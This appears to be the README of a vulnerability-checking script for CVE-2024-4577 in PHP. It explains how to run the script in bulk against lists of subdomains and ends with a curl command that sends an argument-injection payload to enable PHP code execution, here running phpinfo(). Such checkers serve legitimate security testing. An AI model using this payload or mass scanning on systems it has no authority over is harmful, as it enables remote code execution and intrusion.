# CVE-2024-4577 Vulnerability Checker

This script is designed to check for the vulnerability described by CVE-2024-4577, which involves exploiting certain PHP configurations to execute arbitrary code remotely. It sends a POST request to specified endpoints on a list of domains and checks if the response indicates vulnerability.

## Usage

1. Install GNU Parallel:

   ```bash
   sudo apt-get install parallel
   ```
   
2. **Clone the Repository:**
   Clone this repository to your local machine using Git:

   ```bash
   git clone https://github.com/your-username/CVE-2024-4577.git
   ```

3. **Navigate to the Repository:**
   Change into the cloned directory:

   ```bash
   cd CVE-2024-4577
   ```

4. **Prepare Domain List:**
   Create a text file containing a list of domains to check. Each domain should be on a new line. For example:

   ```
   https://example1.com
   https://example2.com
   https://example3.com
   ```

5. **Run the Script:**
   Execute the script `CVE-2024-4577.sh`, passing the path to the domain list file as an argument:

   ```bash
   ./CVE-2024-4577.sh live-subdomains.txt | tee script.log
   ```

6. **Review Output:**
   The script will display progress information as it checks each domain. If a domain is found to be vulnerable, it will be highlighted in red. The script will also export a list of vulnerable domains to a file named `vulnerable_domains.txt`.

#### Exported File: `vulnerable_domains.txt`

The script exports a list of vulnerable domains to a file named `vulnerable_domains.txt`. This file contains a simple list of vulnerable domains, with each domain on a new line. To further manually confirm, use the curl command to send a POST request to the target endpoint on the domain. Replace https://dev.example.com/test.php with the actual endpoint on the target domain.

```bash
curl -X POST https://dev.example.com/test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input \
     -H "User-Agent: curl/8.3.0" \
     --data "<?php phpinfo(); ?>"
```
